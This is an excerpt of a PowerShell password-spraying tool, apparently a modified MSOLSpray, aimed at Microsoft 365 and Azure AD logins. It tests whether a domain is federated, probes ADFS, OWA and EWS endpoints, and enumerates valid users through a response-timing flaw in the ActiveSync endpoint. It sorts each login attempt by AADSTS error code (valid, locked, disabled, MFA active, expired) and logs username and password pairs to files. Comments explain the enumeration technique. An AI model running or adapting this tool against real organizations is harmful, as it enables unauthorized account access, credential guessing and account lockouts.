...
#>
  Param(
	...
	# This method allow us to know more about target domain, testing if was Managed or Federated by some ADFS Service.
	...
	if ($webrequest.Credentials -match "FederationRedirectUrl") {
		...
		Write-Host
        	$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
		"[ REDIRECTED : $current_time ] = $username : $password : $federation " | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		...
		if ($federation -match "/adfs/ls") {
			...
			if ($new_webrequest.Rawcontent -match "The resource you are trying to access is not available.") {
				...
				Write-Host
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ /adfs/ls/IdpInitiatedSignOn.aspx : $current_time ] = $new_url " | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
			}
		}
		...
		If ($status_code_resp -match "401") {
			...
			Write-Host
			$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
			"[ /owa/auth.owa : $current_time ] = $new_url " | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		...
		If ($status_code_resp -match "401") {
			...
			Write-Host
			$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
			"[ /EWS/Exchange.asmx : $current_time ] = $new_url " | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		...
		ForEach ($username in $Usernames) {
			...
			#
			# First of all, let's say that your domain does not exists. With that i can tell you that it should return the same
			# kind of thing as office365username.py does.
			# Let's back on time when it vulnerability worked as well.
			#
			# At below, you can see the explanation how /Microsoft-Active-Sync on microsoft servers was attacked w/ @grimhacker script.
			#
			# if status == 401:
			...
			#
			# This explains itself right? it's a page_status_code vulnerability. So, a thing which @grimhacker does not coded
			# was that 200 CODE also is returned by server if your DOMAIN is not Managed by microsoft, which means, if your TARGET
			# have a [FederationRedirectUrl] to connect internally on his server or through another e-mail auth mechanism.
			#
			# As we can see, it happens the same way as said before, if your Target Domain does not stay Managed by Microsoft,
			# the return of seconds in all tries of user enumeration will return between 4 and 6 seconds,
			# meaning that it returned TRUE as office365userenum.py
			#
			#
			...
			if (($webrequest_time -ge 3) -and ($webrequest_time -le 7)) {
				...
				Write-Host -ForegroundColor "blue" "[!] INFO! [RESP TIME: $webrequest_time] [/Microsoft-Active-Sync] $username is valid but password seems incorrect. Writing INFO to outputs/only-valid-users_w_pass_incorrect.txt"
				$username | Out-File  -Encoding ascii -Append "outputs/only-valid-users_w_pass_incorrect.txt"

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_USER_W_INCORRET_PASSWORD : $current_time [RESP TIME: $webrequest_time]] = $username : $password" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
			  ...
			  # If Username + Password valid Microsoft-Active-Sync Timing should return 403 or 200
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID : $current_time ] = $username : $password" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ INVALID : $current_time ] = $username : $password" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
				continue
			}
		}
		exit
	...
	ForEach ($username in $Usernames) {
		...
		If ($webrequest.StatusCode -eq "200") {
		    ...
		    If($RespErr -match "AADSTS50126")
		        {
		        	Write-Host -ForegroundColor "yellow" "[!] INFO! $username is valid but password seems incorrect. Writing INFO to outputs/only-valid-users_w_pass_incorrect.txt"
				$username | Out-File  -Encoding ascii -Append "outputs/only-valid-users_w_pass_incorrect.txt"

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_USER_W_INCORRET_PASSWORD : $current_time : AADSTS50126 ] = $username : $password" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
				continue
		        }
		    ...
		    ElseIf(($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ INEXISTENT_ON_DOMAIN : $current_time : AADSTS50128 ] = $username : $password" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		        }
		    ...
		    ElseIf($RespErr -match "AADSTS50034")
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ INEXISTENT : $current_time ] = $username : $password : AADSTS50034" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		        }
		    ...
		    ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_AND_IN_USE : $current_time ] = $username : $password : AADSTS50079|AADSTS50076" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		    ...
		    ElseIf($RespErr -match "AADSTS50158")
		        {
		        	...
		        	$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_AND_IN_USE : $current_time ] = $username : $password : AADSTS50158" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		    ...
		    ElseIf($RespErr -match "AADSTS50053")
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ LOCKED : $current_time ] = $username : $password : AADSTS50053" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		    ...
		    ElseIf($RespErr -match "AADSTS50057")
				...
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ DISABLED : $current_time ] = $username : $password : AADSTS50057" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
		        }
		    ...
		    ElseIf($RespErr -match "AADSTS50055")
		        {
		        	...
		        	$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ PASSWORD_EXPIRED : $current_time ] = $username : $password : AADSTS50055" | Out-File -Encoding ascii -Append "outputs/logging_file_MSOLSpray.txt"
	...
	Write-Host -ForegroundColor "blue" "[ DEBUG ] Results have been written to outputs/logging_file_MSOLSpray.txt and outputs/only-valid-users.txt"
}
